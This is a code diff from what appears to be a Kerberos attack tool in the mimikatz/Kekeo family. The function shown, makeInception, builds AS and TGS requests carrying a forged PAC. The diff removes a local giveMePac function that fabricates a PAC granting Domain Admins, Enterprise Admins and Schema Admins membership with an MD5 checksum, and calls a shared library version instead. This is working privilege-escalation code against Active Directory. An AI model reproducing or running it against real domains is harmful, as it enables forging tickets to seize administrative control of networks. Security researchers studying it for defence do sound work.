@@ -175,7 +175,7 @@ void makeInception(PCSTR user, PCSTR domain, PSID sid, DWORD rid, EncryptionKey 
 				if(kull_m_kerberos_asn1_helper_build_EncKDCRepPart_from_Rep(AsRep, &encAsRepPart, key, EncASRepPart_PDU))
 				{
 					kprintf(" [level 2] Van Chase     (PAC TIME)\n");
-					if(giveMePac(user, sid, rid, &encAsRepPart->authtime, KERB_CHECKSUM_MD5, NULL, &pac))
+					if(kuhl_m_pac_giveMePac(user, sid, rid, &encAsRepPart->authtime, KERB_CHECKSUM_MD5, NULL, &pac))
 					{
 						kprintf(" [level 3] The Hotel     (TGS-REQ)\n");
 						if(kull_m_kerberos_asn1_helper_build_KdcReq(user, domain, &encAsRepPart->key, "krbtgt", NULL, FALSE, &AsRep->ticket, &pac, &TgsReq))
@@ -391,43 +391,4 @@ void impersonateToGetData(PCSTR user, PCSTR domain, PCSTR password, PCSTR kdc, P
 		}
 		RtlFreeUnicodeString(&uUser);
 	}
-}
-
-GROUP_MEMBERSHIP defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAULT_GROUP_ATTRIBUTES}, {520, DEFAULT_GROUP_ATTRIBUTES}, {518, DEFAULT_GROUP_ATTRIBUTES}, {519, DEFAULT_GROUP_ATTRIBUTES},};
-BOOL giveMePac(PCSTR Username, PSID DomainSid, DWORD UserId, KerberosTime *AuthTime, DWORD SignatureType, EncryptionKey * SignatureKey, _octet1 *pac)
-{
-	BOOL status = FALSE;
-	KERB_VALIDATION_INFO validationInfo = {0};
-	STRING user;
-	kull_m_kerberos_asn1_helper_util_UTCKerberosTimeToFileTime(AuthTime, &validationInfo.LogonTime);
-	KIWI_NEVERTIME(&validationInfo.LogoffTime);
-	KIWI_NEVERTIME(&validationInfo.KickOffTime);
-	KIWI_NEVERTIME(&validationInfo.PasswordLastSet);
-	KIWI_NEVERTIME(&validationInfo.PasswordCanChange);
-	KIWI_NEVERTIME(&validationInfo.PasswordMustChange);
-
-	pac->length = 0;
-	pac->value = NULL;
-
-	RtlInitString(&user, Username);
-	if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&validationInfo.EffectiveName, &user, TRUE)))
-	{
-		validationInfo.LogonDomainId = (PISID) DomainSid;
-
-		validationInfo.UserId				= UserId;
-		validationInfo.UserAccountControl	= USER_DONT_EXPIRE_PASSWORD | USER_NORMAL_ACCOUNT;
-		validationInfo.PrimaryGroupId		= defaultGroups[0].RelativeId;
-		validationInfo.GroupCount = ARRAYSIZE(defaultGroups);
-		validationInfo.GroupIds = defaultGroups;
-
-		if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, SignatureType, (PPACTYPE *) &pac->value, (DWORD *) &pac->length))
-		{
-			kprintf("  * PAC generated\n");
-			if(status = NT_SUCCESS(kuhl_m_pac_signature((PPACTYPE) pac->value, pac->length, SignatureType, SignatureKey ? SignatureKey->keyvalue.value : NULL, SignatureKey ?  SignatureKey->keyvalue.length : 0)))
-				kprintf("  * PAC \"\"\"signed\"\"\"\n");
-			else LocalFree(pac->value);
-		}
-		RtlFreeUnicodeString(&validationInfo.EffectiveName);
-	}
-	return status;
 }
